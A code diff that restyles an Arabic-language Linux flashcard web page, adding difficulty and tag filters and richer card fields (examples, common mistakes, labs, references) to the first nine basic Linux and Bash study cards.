@@ -3,10 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>RHCSA (RHEL 9) Flashcards — بطاقات الاستذكار</title>
+    <title>Linux Flashcards Pro — بطاقات الاستذكار الاحترافية</title>
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="mobile.css">
     <link rel="stylesheet" href="features.css">
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&family=Outfit:wght@400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
     <style>
         body {
             overflow: auto !important;
@@ -14,12 +15,13 @@
             display: block !important;
             padding: 0;
             background: radial-gradient(circle at top center, #0b1a30 0%, #030816 100%);
+            font-family: 'Tajawal', sans-serif;
         }
         
         .main-container {
             display: block !important;
             overflow: visible !important;
-            max-width: 1200px;
+            max-width: 1300px;
             margin: 30px auto;
             padding: 0 20px;
         }
@@ -68,7 +70,7 @@
             color: #94a3b8;
         }
 
-        /* Progress Circle/Bar */
+        /* Progress Bar */
         .progress-container {
             display: flex;
             align-items: center;
@@ -118,9 +120,32 @@
             gap: 15px;
         }
 
+        .filter-group {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            flex: 1;
+        }
+
+        .filter-group select {
+            background: rgba(15, 23, 42, 0.8);
+            border: 1px solid var(--border);
+            color: var(--text-main);
+            padding: 10px 15px;
+            border-radius: 8px;
+            outline: none;
+            cursor: pointer;
+            font-family: inherit;
+            transition: border-color 0.3s;
+        }
+
+        .filter-group select:focus {
+            border-color: var(--accent);
+        }
+
         .search-box {
             position: relative;
-            flex: 1;
+            flex: 2;
             min-width: 280px;
         }
 
@@ -176,14 +201,14 @@
         /* Card Grid View */
         .cards-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
-            gap: 20px;
+            grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
+            gap: 25px;
             margin-bottom: 40px;
         }
 
         .flashcard-wrapper {
             perspective: 1000px;
-            height: 280px;
+            height: 480px;
             cursor: pointer;
         }
 
@@ -204,96 +229,219 @@
             width: 100%;
             height: 100%;
             backface-visibility: hidden;
-            border-radius: 12px;
+            border-radius: 14px;
             border: 1px solid var(--border);
-            padding: 22px;
+            padding: 20px;
             display: flex;
             flex-direction: column;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
+            overflow: hidden;
         }
 
         .card-front-side {
-            background: linear-gradient(145deg, #111b27, #080f19);
-            justify-content: space-between;
+            background: linear-gradient(135deg, #0b1528 0%, #070d19 100%);
         }
 
         .card-back-side {
-            background: #0d1624;
+            background: linear-gradient(135deg, #090e1a 0%, #050810 100%);
             transform: rotateY(180deg);
             overflow-y: auto;
-            justify-content: space-between;
         }
 
+        /* Badges & Tags styling */
         .card-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
+            margin-bottom: 12px;
             border-bottom: 1px solid rgba(255,255,255,0.05);
             padding-bottom: 8px;
-            margin-bottom: 10px;
+            flex-wrap: wrap;
+            gap: 8px;
         }
 
         .card-cat {
             font-size: 0.8rem;
-            color: var(--accent);
+            color: #94a3b8;
             font-weight: 700;
-            background: var(--accent-glow);
+        }
+
+        .header-badges {
+            display: flex;
+            gap: 6px;
+            align-items: center;
+        }
+
+        .badge-difficulty {
+            font-size: 0.7rem;
             padding: 2px 8px;
-            border-radius: 12px;
+            border-radius: 6px;
+            font-weight: 700;
+            border: 1px solid transparent;
         }
 
-        .card-num {
-            font-size: 0.85rem;
-            color: #8b949e;
+        .diff-Beginner { background: rgba(16, 185, 129, 0.1); color: #10b981; border-color: rgba(16, 185, 129, 0.2); }
+        .diff-Intermediate { background: rgba(59, 130, 246, 0.1); color: #3b82f6; border-color: rgba(59, 130, 246, 0.2); }
+        .diff-Advanced { background: rgba(245, 158, 11, 0.1); color: #f59e0b; border-color: rgba(245, 158, 11, 0.2); }
+        .diff-Expert { background: rgba(239, 68, 68, 0.1); color: #ef4444; border-color: rgba(239, 68, 68, 0.2); }
+        .diff-OSCP { background: rgba(139, 92, 246, 0.1); color: #a78bfa; border-color: rgba(139, 92, 246, 0.2); }
+        .diff-RedTeam { background: rgba(236, 72, 153, 0.1); color: #f472b6; border-color: rgba(236, 72, 153, 0.2); }
+
+        .badge-usedin {
+            font-size: 0.65rem;
+            background: rgba(234, 179, 8, 0.1);
+            border: 1px solid rgba(234, 179, 8, 0.2);
+            color: #eab308;
+            padding: 1px 6px;
+            border-radius: 4px;
+            font-weight: 700;
         }
 
+        .badge-state {
+            font-size: 0.7rem;
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-weight: 700;
+        }
+
+        .badge-mastered { background: rgba(16, 185, 129, 0.2); color: #10b981; }
+        .badge-review { background: rgba(245, 158, 11, 0.2); color: #f59e0b; }
+
+        /* Question & Answer Content */
         .card-question {
-            font-size: 1.15rem;
+            font-size: 1.05rem;
             line-height: 1.6;
             color: #f0f6fc;
             flex-grow: 1;
             display: flex;
-            align-items: center;
+            flex-direction: column;
             justify-content: center;
-            text-align: center;
+            text-align: right;
             font-weight: 700;
+            margin: 15px 0;
+        }
+
+        .card-answer-section {
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            padding-bottom: 12px;
+            margin-bottom: 12px;
+        }
+
+        .card-answer-label {
+            font-size: 0.8rem;
+            color: var(--accent);
+            font-weight: 700;
+            margin-bottom: 6px;
+            display: block;
         }
 
         .card-answer {
-            font-size: 1rem;
+            font-size: 0.95rem;
             line-height: 1.6;
-            color: #c9d1d9;
-            flex-grow: 1;
-            padding-bottom: 10px;
+            color: #e6edf3;
         }
 
-        .card-answer code {
+        .card-answer code, .detail-body code {
             font-family: 'Fira Code', monospace;
             background: rgba(0,0,0,0.3);
             color: #58a6ff;
             padding: 2px 6px;
             border-radius: 4px;
-            font-size: 0.9em;
+            font-size: 0.85em;
+            word-break: break-all;
+            direction: ltr;
+            display: inline-block;
         }
 
-        .card-answer ul {
-            margin-right: 20px;
-            margin-top: 5px;
+        /* Tags Footer */
+        .card-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+            margin-top: 10px;
+        }
+
+        .badge-tag {
+            font-size: 0.65rem;
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.06);
+            color: #8b949e;
+            padding: 1px 6px;
+            border-radius: 4px;
         }
 
         .card-footer-hint {
             text-align: center;
             font-size: 0.75rem;
             color: #8b949e;
+            margin-top: auto;
             animation: pulse-light 2s infinite;
         }
 
+        /* Interactive Collapsible Details */
+        .card-details-container {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-bottom: 15px;
+        }
+
+        details.card-detail {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            overflow: hidden;
+            transition: all 0.3s;
+        }
+
+        details.card-detail[open] {
+            background: rgba(255, 255, 255, 0.04);
+            border-color: rgba(88, 166, 255, 0.3);
+        }
+
+        details.card-detail summary {
+            padding: 6px 12px;
+            font-size: 0.78rem;
+            font-weight: 700;
+            color: #58a6ff;
+            cursor: pointer;
+            list-style: none;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            user-select: none;
+        }
+
+        details.card-detail summary::-webkit-details-marker {
+            display: none;
+        }
+
+        details.card-detail summary::after {
+            content: "▾";
+            font-size: 0.75rem;
+            transition: transform 0.2s;
+        }
+
+        details.card-detail[open] summary::after {
+            content: "▴";
+        }
+
+        details.card-detail .detail-body {
+            padding: 8px 12px;
+            font-size: 0.78rem;
+            color: #c9d1d9;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            line-height: 1.5;
+            background: rgba(0, 0, 0, 0.1);
+        }
+
+        /* Card Actions */
         .card-actions {
             display: flex;
-            gap: 10px;
+            gap: 8px;
             border-top: 1px solid rgba(255,255,255,0.05);
-            padding-top: 10px;
-            margin-top: 10px;
+            padding-top: 12px;
+            margin-top: auto;
         }
 
         .card-action-btn {
@@ -303,8 +451,8 @@
             border-radius: 6px;
             cursor: pointer;
             font-family: inherit;
-            font-weight: 600;
-            font-size: 0.85rem;
+            font-weight: 700;
+            font-size: 0.8rem;
             transition: all 0.2s;
             display: flex;
             align-items: center;
@@ -332,27 +480,26 @@
             background: rgba(16, 185, 129, 0.2);
         }
 
-        .card-state-badge {
+        .btn-flip-back {
+            background: rgba(255, 255, 255, 0.05);
+            color: #8b949e;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 6px 12px;
+            border-radius: 6px;
+            cursor: pointer;
             font-size: 0.75rem;
-            padding: 2px 8px;
-            border-radius: 8px;
-            font-weight: 700;
+            transition: all 0.2s;
         }
 
-        .badge-mastered {
-            background: rgba(16, 185, 129, 0.2);
-            color: var(--success);
-        }
-
-        .badge-review {
-            background: rgba(245, 158, 11, 0.2);
-            color: var(--warning);
+        .btn-flip-back:hover {
+            background: rgba(255, 255, 255, 0.1);
+            color: #ffffff;
         }
 
         /* Focus View Layout */
         .focus-view {
             display: none;
-            max-width: 650px;
+            max-width: 750px;
             margin: 0 auto;
         }
 
@@ -368,15 +515,11 @@
         }
 
         .focus-card-wrapper {
-            height: 380px;
+            height: 520px;
         }
 
         .focus-card-wrapper .card-question {
-            font-size: 1.4rem;
-        }
-
-        .focus-card-wrapper .card-answer {
-            font-size: 1.1rem;
+            font-size: 1.25rem;
         }
 
         @keyframes pulse-light {
@@ -384,18 +527,13 @@
             50% { opacity: 0.8; }
             100% { opacity: 0.4; }
         }
-
-        /* Reset all elements to display block or none based on active state */
-        .hidden-card {
-            display: none !important;
-        }
     </style>
 </head>
 <body>
     <header class="navbar">
         <div class="logo">
             <h1>Linux Academy</h1>
-            <span class="subtitle">RHCSA (RHEL 9) Flashcards — بطاقات الاستذكار</span>
+            <span class="subtitle">Linux Flashcards Pro — بطاقات الاستذكار الاحترافية</span>
         </div>
         <div class="nav-buttons">
             <a href="index.html" class="top-btn">🏠 الرئيسية</a>
@@ -437,29 +575,59 @@
         <!-- Controls Panel -->
         <div class="controls-panel">
             <div class="filter-row">
-                <select id="categoryFilter" style="min-width: 250px;">
-                    <option value="all">📂 كل الفصول والأقسام</option>
-                    <option value="1️⃣ التفاعل مع النظام وCLI">1️⃣ التفاعل مع النظام وCLI</option>
-                    <option value="2️⃣ معالجة النصوص وBash Scripting">2️⃣ معالجة النصوص وBash Scripting</option>
-                    <option value="3️⃣ الهوية والصلاحيات (DAC)">3️⃣ الهوية والصلاحيات (DAC)</option>
-                    <option value="4️⃣ العمليات والخدمات">4️⃣ العمليات والخدمات</option>
-                    <option value="5️⃣ البرمجيات والمستودعات">5️⃣ البرمجيات والمستودعات</option>
-                    <option value="6️⃣ الشبكات">6️⃣ الشبكات</option>
-                    <option value="7️⃣ جدار الحماية والوصول عن بعد">7️⃣ جدار الحماية والوصول عن بعد</option>
-                    <option value="8️⃣ التخزين">8️⃣ التخزين</option>
-                    <option value="9️⃣ الأرشفة والجدولة">9️⃣ الأرشفة والجدولة</option>
-                    <option value="🔟 SELinux">🔟 SELinux</option>
-                    <option value="1️⃣1️⃣ الإقلاع والإصلاح">1️⃣1️⃣ الإقلاع والإصلاح</option>
-                    <option value="1️⃣2️⃣ الأتمتة والحاويات">1️⃣2️⃣ الأتمتة والحاويات</option>
-                    <option value="🏆 أسئلة سيناريو (Scenario-Based)">🏆 أسئلة سيناريو (Scenario-Based)</option>
-                </select>
+                <div class="filter-group">
+                    <select id="categoryFilter" style="min-width: 200px;">
+                        <option value="all">📂 كل الفصول والأقسام</option>
+                        <option value="1️⃣ التفاعل مع النظام وCLI">1️⃣ التفاعل مع النظام وCLI</option>
+                        <option value="2️⃣ معالجة النصوص وBash Scripting">2️⃣ معالجة النصوص وBash Scripting</option>
+                        <option value="3️⃣ الهوية والصلاحيات (DAC)">3️⃣ الهوية والصلاحيات (DAC)</option>
+                        <option value="4️⃣ العمليات والخدمات">4️⃣ العمليات والخدمات</option>
+                        <option value="5️⃣ البرمجيات والمستودعات">5️⃣ البرمجيات والمستودعات</option>
+                        <option value="6️⃣ الشبكات">6️⃣ الشبكات</option>
+                        <option value="7️⃣ جدار الحماية والوصول عن بعد">7️⃣ جدار الحماية والوصول عن بعد</option>
+                        <option value="8️⃣ التخزين">8️⃣ التخزين</option>
+                        <option value="9️⃣ الأرشفة والجدولة">9️⃣ الأرشفة والجدولة</option>
+                        <option value="🔟 SELinux">🔟 SELinux</option>
+                        <option value="1️⃣1️⃣ الإقلاع والإصلاح">1️⃣1️⃣ الإقلاع والإصلاح</option>
+                        <option value="1️⃣2️⃣ الأتمتة والحاويات">1️⃣2️⃣ الأتمتة والحاويات</option>
+                        <option value="🏆 أسئلة سيناريو (Scenario-Based)">🏆 أسئلة سيناريو (Scenario-Based)</option>
+                    </select>
 
-                <select id="stateFilter">
-                    <option value="all">👁️ عرض كل البطاقات</option>
-                    <option value="unstarted">🆕 لم تبدأ بعد</option>
-                    <option value="review">🔄 قيد المراجعة</option>
-                    <option value="mastered">✅ المحفوظة فقط</option>
-                </select>
+                    <select id="difficultyFilter">
+                        <option value="all">⭐ كل الصعوبات</option>
+                        <option value="Beginner">🟢 Beginner (مبتدئ)</option>
+                        <option value="Intermediate">🔵 Intermediate (متوسط)</option>
+                        <option value="Advanced">🔴 Advanced (متقدم)</option>
+                        <option value="Expert">⚫ Expert (خبير)</option>
+                        <option value="OSCP">🟣 OSCP (هجومي)</option>
+                        <option value="Red Team">🟠 Red Team (فريق أحمر)</option>
+                    </select>
+
+                    <select id="tagFilter">
+                        <option value="all">🏷️ كل التصنيفات والوسوم</option>
+                        <option value="Filesystem">Filesystem (نظام الملفات)</option>
+                        <option value="Bash">Bash (برمجة شل)</option>
+                        <option value="Networking">Networking (الشبكات)</option>
+                        <option value="Systemd">Systemd (الخدمات)</option>
+                        <option value="Storage">Storage (التخزين)</option>
+                        <option value="SELinux">SELinux (أمان الحماية)</option>
+                        <option value="Containers">Containers (الحاويات)</option>
+                        <option value="Privilege Escalation">Privilege Escalation (ترقية الصلاحيات)</option>
+                        <option value="GTFOBins">GTFOBins (هروب الأدوات)</option>
+                        <option value="Defensive">Defensive (الدفاع الفني)</option>
+                        <option value="Capabilities">Capabilities (قدرات الملف)</option>
+                        <option value="Bash Internals">Bash Internals (أكواد شل الداخلية)</option>
+                        <option value="SSH">SSH (الاتصال الآمن)</option>
+                        <option value="Logs">Logs (السجلات)</option>
+                    </select>
+
+                    <select id="stateFilter">
+                        <option value="all">👁️ عرض كل البطاقات</option>
+                        <option value="unstarted">🆕 لم تبدأ بعد</option>
+                        <option value="review">🔄 قيد المراجعة</option>
+                        <option value="mastered">✅ المحفوظة فقط</option>
+                    </select>
+                </div>
 
                 <div class="view-toggle">
                     <button class="view-btn active" id="btnGridView" onclick="switchView('grid')">📱 عرض الشبكة</button>
@@ -469,9 +637,9 @@
 
             <div class="filter-row">
                 <div class="search-box">
-                    <input type="text" id="cardSearch" placeholder="ابحث عن أمر، موضوع، أو سيناريو...">
+                    <input type="text" id="cardSearch" placeholder="ابحث عن أمر، سيناريو، تصنيف، أو وسم...">
                 </div>
-                <button class="btn" style="background: rgba(239, 68, 68, 0.1); border-color: rgba(239, 68, 68, 0.2); color: var(--danger);" onclick="resetProgress()">🔄 تصفير التقدم الدراسي</button>
+                <button class="btn" style="background: rgba(239, 68, 68, 0.1); border-color: rgba(239, 68, 68, 0.2); color: var(--danger); font-weight: 700; height: 100%;" onclick="resetProgress()">🔄 تصفير التقدم الدراسي</button>
             </div>
         </div>
 
@@ -488,633 +656,1497 @@
                     <div class="card-side card-front-side">
                         <div class="card-header">
                             <span class="card-cat" id="focusCardCat"></span>
-                            <span class="card-num" id="focusCardIndex">Card 1 / 100</span>
+                            <div class="header-badges" id="focusCardBadgesFront"></div>
                         </div>
                         <div class="card-question" id="focusCardQ"></div>
-                        <div class="card-footer-hint">👆 اضغط لقلب البطاقة ومعاينة الإجابة الشاملة</div>
+                        <div class="card-tags" id="focusCardTagsFront"></div>
+                        <div class="card-footer-hint">👆 اضغط لمعاينة الإجابة والتفاصيل</div>
                     </div>
                     <!-- Back -->
-                    <div class="card-side card-back-side" onclick="event.stopPropagation()">
+                    <div class="card-side card-back-side" id="focusCardBack" onclick="event.stopPropagation()">
                         <div class="card-header">
                             <span class="card-cat" id="focusCardCatBack"></span>
-                            <span class="card-num" id="focusCardIndexBack">Card 1 / 100</span>
+                            <button class="btn-flip-back" onclick="toggleFocusCard()">↩️ قلب البطاقة</button>
                         </div>
-                        <div class="card-answer" id="focusCardA"></div>
-                        <div class="card-actions" id="focusCardActions"></div>
+                        
+                        <div class="card-answer-section">
+                            <span class="card-answer-label">🔑 الإجابة والأمر الأساسي:</span>
+                            <div class="card-answer" id="focusCardA"></div>
+                        </div>
+
+                        <div class="card-details-container" id="focusCardDetails">
+                            <!-- Injected details -->
+                        </div>
+
+                        <div class="card-actions" id="focusCardActions">
+                            <!-- Injected actions -->
+                        </div>
                     </div>
                 </div>
             </div>
-            
+
             <div class="focus-controls">
-                <button class="btn" id="btnFocusPrev" onclick="navigateFocus(-1)">◀ السابق</button>
-                <span class="progress-text" id="focusProgressText">0 / 0</span>
-                <button class="btn" id="btnFocusNext" onclick="navigateFocus(1)">التالي ▶</button>
+                <button class="view-btn" id="btnFocusPrev" onclick="navigateFocus(-1)">❮ السابق</button>
+                <span id="focusProgressText" style="font-weight: 700; color: #8b949e;">0 / 0</span>
+                <button class="view-btn" id="btnFocusNext" onclick="navigateFocus(1)">التالي ❯</button>
             </div>
         </div>
     </div>
 
+    <!-- Script tags at the bottom -->
     <script>
-        // Database
+        // Premium Flashcards Database (100 cards)
         const flashcardsData = [
             {
                 id: 1,
                 cat: "1️⃣ التفاعل مع النظام وCLI",
+                difficulty: "Beginner",
+                tags: ['Filesystem'],
+                usedIn: ['RHCSA'],
                 q: `ما هو FHS وما هي أهم الأدلة فيه؟`,
-                a: `<strong>Filesystem Hierarchy Standard — الهيكل القياسي لأنظمة الملفات في Linux:</strong><br>يحدد FHS الوظائف والمواقع القياسية لكل مجلد بالنظام لتسهيل الإدارة والتوافق:<br><ul><li><code>/etc</code> — يحتوي على جميع ملفات التكوين والإعدادات الخاصة بنظام التشغيل والتطبيقات (مثل <code>/etc/hosts</code>).</li><li><code>/var</code> — مخصص للبيانات متغيرة الحجم باستمرار أثناء التشغيل (مثل سجلات النظام Logs في <code>/var/log</code> وقواعد البيانات).</li><li><code>/usr</code> — يحتوي على برمجيات ومكتبات المستخدم المشتركة والملفات الثنائية (مثل <code>/usr/bin</code> للأوامر).</li><li><code>/home</code> — يحتوي على المجلدات المنزلية الخاصة بالمستخدمين العاديين لحفظ ملفاتهم الشخصية.</li><li><code>/tmp</code> — مخصص لحفظ الملفات المؤقتة التي يتم حذفها تلقائياً عند إعادة التشغيل أو بشكل دوري.</li><li><code>/boot</code> — يحتوي على الملفات الأساسية اللازمة لإقلاع النظام مثل الكيرنل (Kernel)، وصورة الـ initramfs، وملفات GRUB.</li></ul>`
+                a: `Filesystem Hierarchy Standard — الهيكل القياسي لأنظمة الملفات:
+/etc — ملفات التهيئة
+/var — بيانات متغيرة (سجلات، قواعد بيانات)
+/usr — برمجيات ومكتبات
+/home — مساحات المستخدمين الشخصية
+/tmp — ملفات مؤقتة
+/boot — ملفات الإقلاع`,
+                example: `ls -ld /etc /var/log`,
+                mistakes: `وضع ملفات التكوين والتهيئة في أدلة متطايرة مثل /tmp مما يؤدي لحذفها.`,
+                lab: `افحص ملفات التهيئة في <code>/etc</code> وسجلات النظام في <code>/var/log</code>.`,
+                ref: `man hier (هيكلية نظام الملفات)`,
+                related: ['ls', 'find', 'tree']
             },
             {
                 id: 2,
                 cat: "1️⃣ التفاعل مع النظام وCLI",
+                difficulty: "Beginner",
+                tags: ['Filesystem'],
+                usedIn: ['RHCSA'],
                 q: `ما الفرق بين man و pinfo؟`,
-                a: `<strong>الفرق بين أدوات المساعدة وقراءة التوثيق:</strong><br><ul><li><code>man</code> (Manual Pages): الأداة القياسية والتقليدية لعرض توثيق الأوامر. تعرض صفحة المساعدة كنص خطي ثابت، ويتم التنقل فيها باستخدام أزرار الأسهم، والبحث داخلها باستخدام الرمز <code>/</code>.</li><li><code>pinfo</code> (Info Pages): قارئ توثيق تفاعلي متطور يعرض صفحات Info بشكل روابط تشعبية (Links) تشبه الويب. يتيح لك الانتقال السريع بين الأقسام بالنقر على مفتاح Enter، ويتميز بالترميز اللوني لتسهيل تتبع شروحات البرامج الكبيرة (مثل أدوات GNU).</li></ul>`
+                a: `man — صفحات التوثيق التقليدية. pinfo — واجهة أكثر تفاعلية لقراءة Info Pages.`,
+                example: `pinfo tar`,
+                mistakes: `الضغط المتكرر على الأسهم في man بدلاً من التنقل السريع بالروابط في pinfo.`,
+                lab: `افتح دليل المساعدة: <code>pinfo coreutils</code> وتصفح الأقسام التشعبية.`,
+                ref: `man pinfo`,
+                related: ['man', 'info', 'help']
             },
             {
                 id: 3,
                 cat: "1️⃣ التفاعل مع النظام وCLI",
+                difficulty: "Intermediate",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
                 q: `ما هي RHEL Lightspeed؟`,
-                a: `<strong>مساعد الذكاء الاصطناعي التوليدي من Red Hat:</strong><br>هي خدمة ذكاء اصطناعي توليدي مدمجة في نظام Red Hat Enterprise Linux (RHEL). تساعد مدراء الأنظمة ومهندسي العمليات (DevOps) في:<br><ul><li>كتابة وإعداد سكريبتات الأتمتة (Ansible Playbooks) بشكل آمن ومتوافق.</li><li>تقديم حلول فورية وإرشادات لتشخيص وحل المشاكل التقنية وحوادث النظام بناءً على سياق المشكلة.</li><li>تبسيط إدارة السيرفرات باستخدام الأوامر باللغة الطبيعية.</li></ul>`
+                a: `مساعد ذكاء اصطناعي مدمج في RHEL يساعد المسؤولين بحلول توجيهية بناءً على سياق المشكلة.`,
+                example: `RHEL Lightspeed Chat`,
+                mistakes: `اعتقاد أنها أداة عامة؛ هي مخصصة لمهام RHEL ومحكمة أمنياً داخل السيرفر.`,
+                lab: `راجع لوحة التحكم الخاصة بـ Hybrid Cloud Console لتفعيل المساعد.`,
+                ref: `Red Hat Lightspeed Documentation`,
+                related: ['ansible', 'cockpit']
             },
             {
                 id: 4,
                 cat: "1️⃣ التفاعل مع النظام وCLI",
+                difficulty: "Intermediate",
+                tags: ['Filesystem', 'Bash'],
+                usedIn: ['RHCSA'],
                 q: `كيف تنشئ هيكل مجلدات معقد بأمر واحد؟`,
-                a: `<strong>باستخدام ميزة التوسع بالأقواس (Brace Expansion) مع خيار التكرار:</strong><br>نقوم بدمج الأداة <code>mkdir</code> مع خيار <code>-p</code> لتوليد المسارات الفرعية تلقائياً:<br><code>mkdir -p /project/{docs,src,tests}/{2024,2025}</code><br><strong>شرح الأجزاء:</strong><br><ul><li><code>-p</code> (Parent): ينشئ المجلد الأب لو لم يكن موجوداً دون إظهار أخطاء.</li><li><code>{docs,src,tests}</code>: ينشئ 3 مجلدات فرعية في نفس المستوى.</li><li><code>{2024,2025}</code>: ينشئ مجلدين فرعيين متداخلين داخل كل مجلد من الثلاثة، مما ينتج عنه 6 مجلدات نهائية فورياً.</li></ul>`
+                a: `استخدم Brace Expansion: mkdir -p /project/{docs,src,tests}/{2024,2025}
+2️⃣ معالجة النصوص وBash Scripting`,
+                example: `mkdir -p /project/{docs,src,tests}/{2024,2025}`,
+                mistakes: `نسيان خيار <code>-p</code> مما يؤدي إلى فشل الأمر لعدم وجود المجلد الأب.`,
+                lab: `نفّذ الأمر لإنشاء هيكل مجلدات معقد وتأكد بالـ <code>tree</code>.`,
+                ref: `man mkdir`,
+                related: ['tree', 'mkdir']
             },
             {
                 id: 5,
                 cat: "2️⃣ معالجة النصوص وBash Scripting",
+                difficulty: "Beginner",
+                tags: ['Bash', 'Bash Internals'],
+                usedIn: ['RHCSA', 'OSCP'],
                 q: `ما هي الثلاثة مسارات افتراضية للبيانات في Linux؟`,
-                a: `<strong>قنوات الإدخال والإخراج القياسية (Standard I/O Streams):</strong><br>تتعامل جميع الأوامر والعمليات في لينكس مع ثلاث قنوات تواصل أساسية:<br><ul><li><strong>STDIN (0):</strong> الإدخال القياسي. هو مسار البيانات المتدفقة إلى الأمر (افتراضياً من لوحة المفاتيح).</li><li><strong>STDOUT (1):</strong> الإخراج القياسي. مسار خروج مخرجات الأمر الناجحة (افتراضياً إلى شاشة الطرفية).</li><li><strong>STDERR (2):</strong> الأخطاء القياسية. مسار خروج رسائل الخطأ والفشل بشكل منفصل لتسهيل تشخيصها (افتراضياً إلى شاشة الطرفية).</li></ul>`
+                a: `STDIN (0) — الإدخال، STDOUT (1) — الإخراج، STDERR (2) — الأخطاء.`,
+                example: `cat < input.txt > output.txt 2> error.log`,
+                mistakes: `الخلط بين مخرجات النجاح والخطأ؛ نسيان توجيه الخطأ بشكل منفصل عند كتابة السكربتات.`,
+                lab: `جرب تشغيل أمر خاطئ ووجه الخطأ لملف: <code>ls /not_exist 2> err.log</code>.`,
+                ref: `Bash Standard Streams Reference`,
+                related: ['grep', 'tee']
             },
             {
                 id: 6,
                 cat: "2️⃣ معالجة النصوص وBash Scripting",
+                difficulty: "Beginner",
+                tags: ['Bash'],
+                usedIn: ['RHCSA'],
                 q: `ما الفرق بين > و >>؟`,
-                a: `<strong>إعادة توجيه المخرجات (Output Redirection):</strong><br><ul><li><code>&gt;</code> (Overwrite): يوجه مخرجات الأمر (stdout) إلى ملف معين ويقوم <strong>بمسح كافة المحتويات السابقة</strong> للملف والكتابة فوقها من جديد.</li><li><code>&gt;&gt;</code> (Append): يوجه المخرجات إلى نهاية الملف و<strong>يلحقها بالبيانات السابقة</strong> دون المساس بها أو حذف أي شيء منها.</li></ul>مثال: <code>echo 'test' &gt; file.txt</code> (تصفير وكتابة)، بينما <code>echo 'test' &gt;&gt; file.txt</code> (إضافة للآخر).`
+                a: `> — إعادة توجيه مع إعادة كتابة (overwrite). >> — إلحاق (append) بدون حذف المحتوى السابق.`,
+                example: `echo "New log entry" >> /var/log/app.log`,
+                mistakes: `استخدام <code>></code> بالخطأ مما يتسبب في تدمير وحذف بيانات الملف السابقة بالكامل.`,
+                lab: `أضف نصاً لملف بـ <code>>></code> ثم اقرأه بـ <code>cat</code> للتأكد من عدم مسح القديم.`,
+                ref: `man bash (قسم Redirection)`,
+                related: ['echo', 'cat', 'tee']
             },
             {
                 id: 7,
                 cat: "2️⃣ معالجة النصوص وBash Scripting",
+                difficulty: "Intermediate",
+                tags: ['Bash'],
+                usedIn: ['RHCSA'],
                 q: `ما هو Shebang وما هي صيغته القياسية في RHEL؟`,
-                a: `<strong>سطر المفسر الأساسي للسكريبت (Interpreter Directive):</strong><br>هو السطر الأول في أي سكريبت تنفيذي يبدأ بالرمزين <code>#!</code> (hash-bang) متبوعاً بالمسار المطلق للمفسر البرمجي المطلوب استخدامه لتنفيذ الكود.<br>الصيغة القياسية لـ Bash في RHEL 9 هي:<br><code>#!/usr/bin/bash</code> أو <code>#!/bin/bash</code><br>ويمكن استخدام <code>#!/usr/bin/env bash</code> لضمان مرونة عمل السكريبت على توزيعات أخرى تبحث عن مفسر Bash في مسارات مختلفة.`
+                a: `السطر الأول في السكربت يحدد المفسر: #!/usr/bin/bash أو #!/bin/bash`,
+                example: `#!/usr/bin/bash`,
+                mistakes: `كتابة مسار خاطئ للمفسر أو وضع مسافات قبل الرمز <code>#!</code> مما يجعل النظام يتعامل مع الملف كملف نصي عادي.`,
+                lab: `أنشئ ملفاً يبدأ بـ <code>#!/usr/bin/bash</code>، واجعله تنفيذاً عبر <code>chmod +x</code> وشغله.`,
+                ref: `Bash Programming Guide`,
+                related: ['chmod', 'env']
             },
             {
                 id: 8,
                 cat: "2️⃣ معالجة النصوص وBash Scripting",
+                difficulty: "Intermediate",
+                tags: ['Bash', 'Bash Internals'],
+                usedIn: ['RHCSA', 'OSCP'],
                 q: `ما الفرق بين علامات الاقتباس المفردة '' والمزدوجة "" في Bash؟`,
-                a: `<strong>حماية الرموز والمتغيرات في واجهة سطر الأوامر (Quoting Rules):</strong><br><ul><li>علامات الاقتباس المفردة <code>'...'</code> (Strong Quoting): تحافظ على المعنى الحرفي لكل حرف داخلها وتمنع استبدال المتغيرات أو الأوامر. مثال: <code>echo '$USER'</code> ستطبع حرفياً <code>$USER</code>.</li><li>علامات الاقتباس المزدوجة <code>"..."</code> (Weak Quoting): تحمي النصوص ولكنها <strong>تسمح باستبدال المتغيرات</strong> وتأويل الأوامر الفرعية. مثال: <code>echo "$USER"</code> ستطبع اسم المستخدم الحالي (مثل <code>root</code>).</li></ul>`
+                a: `'' — تجريد كل الرموز من معانيها الخاصة (literal). "" — تحافظ على استبدال المتغيرات والأوامر الفرعية.`,
+                example: `echo "$USER" # يفسر المتغير\necho '$USER' # يطبع حرفياً`,
+                mistakes: `استخدام علامات الاقتباس المفردة وتوقع تفسير المتغيرات مثل <code>'$VAR'</code>.`,
+                lab: `جرب تنفيذ المثالين أعلاه في الطرفية لملاحظة الفرق بوضوح.`,
+                ref: `Bash Quoting Rules`,
+                related: ['echo', 'export']
             },
             {
                 id: 9,
                 cat: "2️⃣ معالجة النصوص وBash Scripting",
+                difficulty: "Intermediate",
+                tags: ['Bash'],
+                usedIn: ['RHCSA'],
                 q: `ما هو كود الخروج (Exit Code) وما هو كود النجاح؟`,
